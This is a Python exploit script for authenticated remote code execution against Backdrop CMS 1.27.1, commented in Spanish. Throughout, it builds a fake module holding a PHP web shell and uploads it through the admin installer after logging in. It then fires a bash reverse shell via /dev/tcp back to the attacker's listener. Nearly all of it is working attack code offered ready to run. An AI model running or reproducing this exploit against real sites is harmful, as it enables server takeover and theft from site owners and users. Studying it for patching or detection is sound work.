#!/usr/bin/env python3

# Author: Álvaro Bernal (aka. trr0r)

import requests, signal, sys, tarfile, json, shutil, argparse
from pwn import *
from termcolor import colored
from bs4 import BeautifulSoup
from threading import Thread
from argformat import StructuredFormatter

# Variable estática
shell_name = "trr0r" # Cambiar según las preferencias

def get_args():

    parser = argparse.ArgumentParser(description=colored("🪂 Backdrop CMS 1.27.1 - Automated Authenticated RCE 🪂\n\n\tej: python3 autoDropRCE.py -t http://backdrop-example.com -i 172.17.0.1 -u trr0r -p trr0r", 'blue', attrs=["bold"]), formatter_class=StructuredFormatter)
    # Required arguements:

    # Target URL
    parser.add_argument("-t", "--target-url", required=True, dest="target_url", help="Target url Backdrop web - ej: http://backdrop-example.com")
    # Host IP
    parser.add_argument("-h-ip", "--host-ip", required=True, dest="host_ip", help="Host IP - ej: 172.17.0.1")
    # Backdrop Username
    parser.add_argument("-u", "--username", required=True, dest="username", help="Valid Backdrop username - ej: trr0r")
    # Backdrop Password
    parser.add_argument("-p", "--password", required=True, dest="password", help="Valid Backdrop password - ej: trr0r\n\n")

    # Optionals Arguments:
    # Listen Port - 4444
    parser.add_argument("-l", "--listen-port", required=False, dest="port", help="Listen port", default=4444)

    args = parser.parse_args()

    target_url = args.target_url
    host_ip  = args.host_ip
    username = args.username
    password = args.password
    port = args.port

    return [target_url, host_ip, username, password, port]

def ctrl_c(key, event):
    print(colored("\n[!] Saliendo ...\n", 'red'))
    sys.exit(1)

signal.signal(signal.SIGINT, ctrl_c)

def create_tar():

    info_content = """
    type = module
    name = Block
    backdrop = 1.x
    version = 1.27.1
    """
    shell_content = "<?php system($_GET[0]); ?>"

    # Creamos el directorio donde meteremos el .php y el .info
    os.mkdir(shell_name)

    with open(f"{shell_name}/{shell_name}.info", "w") as file:
        file.write(info_content)

    with open(f"{shell_name}/{shell_name}.php", "w") as file:
        file.write(shell_content)

    with tarfile.open(f"{shell_name}.tar", 'w') as tar:
        tar.add(f"{shell_name}/{shell_name}.info")
        tar.add(f"{shell_name}/{shell_name}.php")

    # Una vez creado el .tar, podemos borrar el directorio
    shutil.rmtree(shell_name)

def login(url, username, password):

    p = log.progress(colored("Intenando logearse en la página web", 'blue'))

    login_url = f"{url}/?q=user/login"

    body_request = {
        "name": f"{username}",
        "pass": f"{password}",
        "form_build_id": "form-oSG0zaXjlqnS_cIYc72m1NRWxQemHSdWyK_9HCwWVIA",
        "form_id": "user_login",
        "op": "Log in"
    }
    response = requests.post(login_url, data=body_request, allow_redirects=False)

    if response.status_code == 200:
        p.failure(colored("Usuario o contraseña incorrectos", 'red'))

    cookie = response.cookies.get_dict()

    p.success(colored(f"Logeado correctamente, la cookie es {cookie}", 'green'))

    return cookie

def get_ids(url, cookie):

    ids_url = f"{url}/?q=admin/installer/manual"

    response = requests.get(ids_url, cookies=cookie)

    soup = BeautifulSoup(response.text, "html.parser")

    form_build_id = soup.find("input", attrs={"name": "form_build_id"}).get("value", "No encontrado")
    form_token = soup.find("input", attrs={"name": "form_token"}).get("value", "No encontrado")

    return form_build_id, form_token

def upload_module(url, cookie):

    # Obtenemos dos token (form_build_id, form_token), ya que de distinta forma no podremos subir el modulo malicioso
    form_build_id, form_token = get_ids(url, cookie)

    module_bar = log.progress(colored("Subiendo el modulo malicioso", 'blue'))

    module_url = f"{url}/?q=system/ajax"

    # Establecemos una serie de cabeceras para evitar problemas
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:129.0) Gecko/20100101 Firefox/129.0",
        "Accept": "application/vnd.backdrop-ajax, */*; q=0.01",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "X-Requested-With": "XMLHttpRequest",
        "DNT": "u1",
        "Connection": "keep-alive",
        "Priority": "u=0"
    }

    files = {
        'files[project_upload]': (f'{shell_name}.tar', open(f'{shell_name}.tar', 'rb'), 'application/x-tar'),
        'form_build_id': (None, f"{form_build_id}"),
        'form_token' : (None, f"{form_token}"),
        "form_id" : (None, "installer_manager_install_form")
    }

    response = requests.post(module_url,files=files, headers=headers, cookies=cookie)

    data = json.loads(response.text)

    url = next(filter(lambda item: "url" in item, data), {}).get("url", "No encontrado")

    # Bucle infinito para comprobar cuando se ha subido el modulo correctamente
    while True:
        response = requests.get(url, cookies=cookie)

        soup = BeautifulSoup(response.text, "html.parser")

        percentage = soup.find("div", class_="percentage").text.strip()
        module_bar.status(colored(f"Subiendo módulo: {percentage}", 'green'))

        if not response.status_code == 200:
            module_bar.failure(colored("Ha ocurrido un error al subir el modulo", 'red'))

        # Cuando el porcetaje sea 100%, se habrá subido el modulo
        if percentage == "100%":
            break

    module_bar.success(colored("Modulo malicioso subido correctamnte", 'green'))

    # Como ya hemos subido el modulo podemos borrar el .tar
    os.remove(f"{shell_name}.tar")

def listening(host_ip, port):
    threading.Thread(target=send_reverse_shell, args=(host_ip, port,)).start()
    # Nos ponemos en escucha por el puerto especificado en la variable port
    listener = listen(port)
    conn = listener.wait_for_connection()

    # Entramos en modo interactivo
    conn.interactive()

def send_reverse_shell(host_ip, port):
    reverse_url = f"{url}/modules/{shell_name}/{shell_name}.php"
    cmd_request = {
        '0' : f'bash -c "bash -i >& /dev/tcp/{host_ip}/{port} 0>&1"'
    }
    # Nos enviamos la Reverse Shell a través del modulo malicioso subido
    requests.get(reverse_url, params=cmd_request)

if __name__ == '__main__':
    url, host_ip, username, password, port = get_args()
    create_tar()
    cookie = login(url, username, password)
    upload_module(url, cookie)
    listening(host_ip, port)